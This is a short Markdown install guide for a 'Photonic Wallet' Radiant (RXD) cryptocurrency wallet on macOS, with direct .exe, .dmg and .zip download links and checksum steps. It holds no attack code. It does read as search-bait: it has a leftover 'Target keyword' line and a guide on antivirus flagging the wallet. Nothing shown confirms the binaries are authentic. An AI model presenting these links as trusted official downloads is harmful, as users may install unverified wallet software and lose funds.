<div align="center">

<img src="https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.png" alt="Photonic Wallet for Radiant (RXD) banner" width="100%">

# Install Photonic Wallet on macOS

[![Website](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-website-photonicwallet-org.svg)](https://photonicwallet.org) [![Release](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-release-v3-0-4.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-docs-guides.svg)](https://github.com/Radiant-projects/photonic-wallet-docs)

</div>

> **Short answer:** Download the .dmg, compare its SHA-256 with shasum, open it and drag Photonic to Applications.

---

## You'll see this if

- You use a Mac
- macOS shows a warning
- You want RXD on Mac

## Why it happens

macOS checks apps downloaded from the internet before first launch. More background lives in our guide on [install photonic wallet on linux](install-photonic-wallet-linux.md) and on the [download page](https://photonicwallet.org/download).

## Fix it step by step

1. Download photonic-wallet-v3.0.4.dmg.
2. Run shasum -a 256 <file>.
3. Compare with the release table.
4. Drag the app to Applications and open it.

## If that didn't work

If the checksum does not match, delete and re-download. The [FAQ](https://photonicwallet.org/faq) covers related cases, and [Verify the Photonic installer SHA-256](verify-photonic-installer-sha256.md) may match your situation.

## Prevention

Keep macOS updated.

> [!WARNING]
> Photonic Wallet will never ask for your seed phrase. Never type it into a website, form or chat.

## FAQ

<details>
<summary><b>Is there a Mac build?</b></summary>

Yes, the DMG in the release.

</details>

<details>
<summary><b>Apple silicon?</b></summary>

Check the release notes for architecture details.

</details>

---

## Get the latest Photonic Wallet

The fix starts with the current desktop release, **[Photonic Wallet v3.0.4](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4)**.

<div align="center">

[![Download Photonic Wallet for Windows](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-windows.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-macos.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-linux.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)

</div>

| Platform | File | Requirements |
|---|---|---|
| **Windows** | [`photonic-wallet-v3.0.4.exe`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) | Windows 10/11, 64-bit |
| **macOS** | [`photonic-wallet-v3.0.4.dmg`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) | macOS (DMG package) |
| **Linux** | [`photonic-wallet-v3.0.4.zip`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip) | x64, ZIP archive |

> [!TIP]
> Compare the SHA-256 checksum with the table on the [tagged release](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) before you run the installer. Source code: [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet).

## Related guides

| Guide | |
|---|---|
| [Install Photonic Wallet on Linux](install-photonic-wallet-linux.md) | Photonic Wallet guide |
| [Verify the Photonic installer SHA-256](verify-photonic-installer-sha256.md) | Photonic Wallet guide |
| [Antivirus flags Photonic Wallet](antivirus-flags-photonic-wallet.md) | Photonic Wallet guide |
| [All Photonic guides](../README.md) | Docs index |

<sub>Target keyword: radiant wallet mac · [photonicwallet.org](https://photonicwallet.org) · [Download](https://photonicwallet.org/download)</sub>
